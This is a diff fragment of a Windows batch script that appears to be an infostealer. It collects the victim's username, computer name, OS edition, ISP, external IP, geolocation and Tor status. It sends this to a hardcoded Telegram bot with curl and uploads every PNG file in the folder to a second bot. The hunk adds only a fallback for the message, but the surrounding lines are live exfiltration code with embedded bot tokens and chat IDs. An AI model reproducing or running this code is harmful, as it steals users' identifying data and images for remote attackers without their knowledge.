@@ -96,6 +96,7 @@ if "%status%"=="404" (
 SET "MSG=%userN%@%computerN% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [{Tor is enabled: %TorStatus%] [Web Server:%WS%]"
 echo %MSG% >> "%userN%@%computerN%.txt"
 for /f "usebackq delims=" %%i in (`powershell -command "$OutputVariable='%MSG%'-replace '[^\x00-\x7F]', ''; $OutputVariable"`) do set "MSG=%%i"
+if [%MSG%]==[] set "MSG=%userN%@%computerN% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [{Tor is enabled: %TorStatus%] [Web Server:%WS%]"
 
 "%environment%\curl.exe" -k %proxy% -F text="NEW CONNECTION: %MSG% " https://api.telegram.org/bot5919717252:AAE3HbKOIhMcsP9NiKLAAZD8Nf9HQhRZgIY/sendMessage?chat_id=-854583574 
 for %%# in ("*.png") do "%environment%\curl.exe" -k %proxy% -F document=@"%%~f#" https://api.telegram.org/bot6053961003:AAENR1HtCpNA7AJaWN1LUnPXxuEsoogKBG8/sendDocument?chat_id=-1001930176759
